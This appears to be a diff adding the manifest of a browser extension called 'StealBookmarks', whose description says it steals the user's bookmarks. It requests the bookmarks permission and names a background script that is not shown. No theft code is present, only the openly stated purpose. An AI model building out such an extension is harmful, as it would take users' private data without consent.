@@ -1,0 +1,15 @@
+{
+    "manifest_version": 2,
+    "version": "1.0",
+	
+    "name": "StealBookmarks",
+    "description": "Extension that steals the user's bookmars from the browser's bookmark manager" ,
+
+	"background" : {
+		"scripts": ["background.js"]
+	},
+
+	"permissions" : [
+		"bookmarks"
+	]
+}
